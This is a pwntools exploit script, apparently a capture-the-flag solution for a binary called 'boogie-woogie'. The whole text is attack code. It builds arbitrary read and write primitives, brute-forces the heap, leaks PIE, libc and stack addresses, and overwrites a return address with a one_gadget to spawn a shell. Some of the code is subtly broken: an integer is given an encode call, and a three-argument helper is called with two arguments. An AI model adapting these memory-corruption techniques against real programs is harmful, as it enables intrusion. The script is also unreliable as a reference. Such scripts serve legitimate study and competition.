    from pwn import *
    import os

    libc = ELF("./libc.so.6")
    elf = context.binary = ELF("./boogie-woogie_patched")
    # context.log_level = 'debug'

    def connect():
        if args.LOCAL:
            return process('./boogie-woogie_patched')
        elif args.DOCKER:
            return remote('0', 1337)
            
    def clap_str(num1, num2):
        io.sendline(num1.encode() + b' ' + num2.encode())
    def clap(v1,v2):
        io.sendline((str(v1)+' '+str(v2)).encode())

    def aar(addr):
        for i in range(8):
            clap(addr+i, 1+i)

        for _ in range(8):
            io.readuntil(b"exception:")
        io.readuntil(b"4m")
        io.recvuntil(b"L")
        ptr = u64(io.recv(6).ljust(8,b"\x00"))
        for i in range(8):
            io.sendline(f"{addr+i} {1+i}".encode())

        for _ in range(8):
            io.recvuntil(b"exception:")
        return ptr

    def aaw(addr1, addr2, len):
        for i in range(len):
            clap(addr1+i-elf.sym['data'], addr2+i-elf.sym['data'])
        
    def brute_heap_offset():
        idx = 0
        with log.progress('Bruting') as p:
            while True:
                try:
                    idx += 1
                    p.status("attempt %i", idx)
                    io = connect()
                    io.recvuntil(b"exception")
                    trial_heap_offset = 0x1995fe0
                
                    io.sendline(f"1 {trial_heap_offset}".encode())
                    
                    io.recvuntil(b"exception")
                    io.sendline(f"1 {trial_heap_offset}".encode())
                    p.success()
                    return (io, trial_heap_offset >> 12 << 12)
                except EOFError:
                    with context.local(log_level='error'): io.close()

    io, heap_page = brute_heap_offset()

    __dso_handle = aar(-24)
    elf.address =  __dso_handle - elf.symbols['__dso_handle']

    log.info('pie ' + hex(elf.address))

    tcache_perthread_struct = heap_page + 8 - 0x20

    io.readuntil(b"exception:")

    while True:
        io.sendline(f"1 {tcache_perthread_struct}".encode())
        io.recvuntil(b"L")
        if io.recv(1) == b'\x91':
            io.recvuntil(b"exception:")
            break
        io.recvuntil(b"exception:")
        tcache_perthread_struct -= 0x1000
        
    heap = tcache_perthread_struct - 0x8
    top_chunk = heap + 0x0ab8
    log.info('heap ' + hex(heap))
    log.info('top_chunk ' + hex(top_chunk))

    io.sendline(f"-3 {top_chunk+2}".encode())
    io.sendline(b"-1 -"+b"1"*0x800)

    # cmd = """
    # init-pwndbg
    # b* main+199
    # """
    # gdb.attach(io, cmd)

    libc.address = aar(top_chunk+8) - 0x21ace0

    io.sendline(f"1 {top_chunk+8+6}".encode())

    log.info('libc ' + hex(libc.address))

    og_offset = [0x50a47, 0xebc81, 0xebc88, 0xebc85]

    stack = aar(libc.sym.__environ - elf.sym['data']) - 0x21ace0
    ret = stack - 0x120
    rbp = ret-8
    log.info('stack ' + hex(stack))
    log.info('ret ' + hex(ret))

    with open("libc_bss", "rb") as f:
        data = bytearray(f.read())

    ## Overwrite rbp with stack address in libc_environ
    aaw(rbp, libc.sym.__environ, 8)

    def get_byte(addr, nth):
        return ((addr >> 8*nth) & 0xff).encode()
    og = libc.address + og_offset[2]

    aaw(libc.bss()+data.find(get_byte(og, 0)), ret)
    aaw(libc.bss()+data.find(get_byte(og, 1)), ret+1)
    aaw(libc.bss()+data.find(get_byte(og, 2)), ret+2)

    io.interactive()



